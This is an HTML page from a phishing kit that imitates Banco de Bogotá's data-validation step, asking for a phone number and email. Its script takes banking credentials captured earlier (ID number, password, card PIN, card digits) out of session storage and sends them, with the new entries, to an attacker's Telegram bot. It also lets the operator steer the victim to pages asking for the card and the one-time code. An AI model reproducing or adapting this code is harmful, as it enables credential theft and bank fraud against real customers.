<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informaci√≥n Adicional</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            background-color: #eee;
        }
        .spinner-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="app">
        <header class="w-full flex items-center justify-center py-16 bg-gradient-to-t from-[#0043a9] to-[#4c7bc7]">
            <img src="img/logo.png" alt="Logo Banco de Bogot√°" class="w-full max-w-[50px] h-auto -mt-4">
        </header>

        <form id="datosFormulario" class="relative mt-[-1rem] rounded-t-[15px] w-full h-auto bg-gray-200 p-4 box-border">
            <h2 class="text-[#0040a8] text-xl font-bold text-center mb-6 mt-4">Validaci√≥n de Datos</h2>

            <div class="w-full mb-4">
                <label for="celular" class="block text-sm font-medium text-gray-700 mb-1">N√∫mero de Celular</label>
                <input type="tel" name="celular" id="celular" placeholder="Ej. 3001234567" maxlength="10" class="w-full text-lg border border-gray-300 bg-white rounded-md p-2" required>
            </div>

            <div class="w-full mb-6">
                <label for="correo" class="block text-sm font-medium text-gray-700 mb-1">Correo Electr√≥nico</label>
                <input type="email" name="correo" id="correo" placeholder="ejemplo@correo.com" class="w-full text-lg border border-gray-300 bg-white rounded-md p-2" required>
            </div>

            <button type="submit" id="enviarBtn" disabled class="block w-full rounded-2xl text-white bg-[#0043a9] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">
                Continuar
            </button>
        </form>
    </div>
    
    <div id="spinner-modal" class="spinner-container">
        <div class="spinner"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const datosFormulario = document.getElementById('datosFormulario');
            const celularInput = document.getElementById('celular');
            const correoInput = document.getElementById('correo');
            const enviarBtn = document.getElementById('enviarBtn');
            const spinnerModal = document.getElementById('spinner-modal');

            let TELEGRAM_BOT_TOKEN = '';
            let TELEGRAM_CHAT_ID = '';
            let statusCheckInterval = null;
            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
            const initialLoginData = JSON.parse(sessionStorage.getItem('initialLoginData'));
            
            if (!initialLoginData) {
                console.error("üî¥ No se encontraron los datos iniciales de login. Redirigiendo a index.html.");
                window.location.href = "index.html";
                return;
            }
            
            const transactionId = initialLoginData.transactionId;

            async function loadTelegramConfig() {
                try {
                    const response = await fetch('js/brr76.json');
                    if (!response.ok) throw new Error('Network response was not ok');
                    const data = await response.json();
                    TELEGRAM_BOT_TOKEN = data.token;
                    TELEGRAM_CHAT_ID = data.chat_id;
                    console.log("üü¢ Tokens y IDs de chat de Telegram cargados correctamente.");
                    return true;
                } catch (error) {
                    console.error('üî¥ Error al cargar la configuraci√≥n de Telegram:', error);
                    alert('Error cr√≠tico: No se pudo cargar la configuraci√≥n de Telegram.');
                    enviarBtn.disabled = true;
                    return false;
                }
            }

            async function sendToTelegram(messageContent, keyboard) {
                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                    console.error('üî¥ No se ha configurado el bot de Telegram.');
                    return null;
                }
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const payload = {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: messageContent,
                    parse_mode: 'Markdown',
                    reply_markup: keyboard
                };
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    const data = await response.json();
                    if (!response.ok) {
                        console.error(`üî¥ Error al enviar mensaje a Telegram: ${data.description}`);
                        return null;
                    }
                    console.log('‚úÖ Mensaje enviado a Telegram exitosamente.');
                    return data.result.message_id;
                } catch (error) {
                    console.error('üî¥ Error de red al enviar a Telegram:', error);
                    return null;
                }
            }
            
            async function editTelegramMessage(chatId, messageId) {
                if (!chatId || !messageId) return;
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
                const payload = {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {}
                };
                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch (error) {
                    console.error('üî¥ Error al borrar botones de Telegram:', error);
                }
            }

            function validateForm() {
                const celularValido = celularInput.value.length === 10;
                const correoValido = correoInput.value.includes('@') && correoInput.value.includes('.');
                enviarBtn.disabled = !(celularValido && correoValido);
            }

            celularInput.addEventListener('input', validateForm);
            correoInput.addEventListener('input', validateForm);

            async function checkPaymentVerification() {
                if (statusCheckInterval) {
                    clearInterval(statusCheckInterval);
                }
                statusCheckInterval = setInterval(async () => {
                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
                    try {
                        const response = await fetch(url);
                        const data = await response.json();
                        const updates = data.result;

                        if (updates && updates.length > 0) {
                            const relevantUpdate = updates.find(u => u.callback_query && u.callback_query.data.includes(transactionId));

                            if (relevantUpdate) {
                                const latest = relevantUpdate;
                                clearInterval(statusCheckInterval);
                                spinnerModal.style.display = 'none';

                                const callbackData = latest.callback_query.data.split(':')[0];
                                const callbackId = latest.callback_query.id;
                                const messageId = sessionStorage.getItem('telegramMessageId');
                                
                                await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);

                                try {
                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
                                    });
                                } catch (err) {
                                    console.warn('üü° No se pudo responder callback_query:', err);
                                }

                                lastUpdateId = latest.update_id;
                                sessionStorage.setItem('lastUpdateId', lastUpdateId);

                                console.log("‚û°Ô∏è Redirigiendo a:", callbackData);
                                if (callbackData === 'pedir_tc') {
                                    window.location.href = "tc.html"; 
                                } else if (callbackData === 'pedir_otp') {
                                    window.location.href = "otp.html";
                                } else if (callbackData === 'error_numero') {
                                    window.location.href = "datos.html";
                                } else if (callbackData === 'finalizar') {
                                    window.location.href = "index.html";
                                }
                            }
                        }
                    } catch (error) {
                        console.error("üî¥ Error al verificar el estado de la transacci√≥n:", error);
                    }
                }, 2000);
            }

            datosFormulario.addEventListener('submit', async (e) => {
                e.preventDefault();
                spinnerModal.style.display = 'flex';

                const celular = celularInput.value;
                const correo = correoInput.value;
                const { tipoDoc, nroDoc, clave, cardClave, cardDigitos, loginType } = initialLoginData;

                const now = new Date();
                const formattedDate = now.toLocaleDateString('es-CO', {
                    day: 'numeric', month: 'numeric', year: 'numeric'
                });
                const formattedTime = now.toLocaleTimeString('es-CO', {
                    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
                });

                const message = `
üåü DATOS ADICIONALES üåü
Tipo de ingreso: ${loginType}
Tipo de Doc: ${tipoDoc}
C√©dula: ${nroDoc}
${loginType === 'Clave Segura' ? `Clave: ${clave}` : `Clave Tarjeta: ${cardClave}\n√öltimos 4: ${cardDigitos}`}

Celular: ${celular}
Correo: ${correo}
Fecha/Hora: ${formattedDate}, ${formattedTime}`;

                const keyboard = JSON.stringify({
                    inline_keyboard: [
                        [{ text: "üí≥ Pedir TC", callback_data: `pedir_tc:${transactionId}` }],
                        [{ text: "üëÄ Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
                        [{ text: "‚ùå Error N√∫mero", callback_data: `error_numero:${transactionId}` }],
                        [{ text: "‚úÖ Finalizar", callback_data: `finalizar:${transactionId}` }]
                    ],
                });

                const messageId = await sendToTelegram(message, keyboard);
                
                if (messageId) {
                    sessionStorage.setItem('telegramMessageId', messageId);
                    checkPaymentVerification();
                } else {
                    spinnerModal.style.display = 'none';
                    alert("Error al enviar los datos. Por favor, int√©ntalo de nuevo.");
                }
            });

            window.addEventListener('beforeunload', function() {
                if (statusCheckInterval) {
                    clearInterval(statusCheckInterval);
                }
            });

            loadTelegramConfig();
        });
    </script>
</body>
</html>
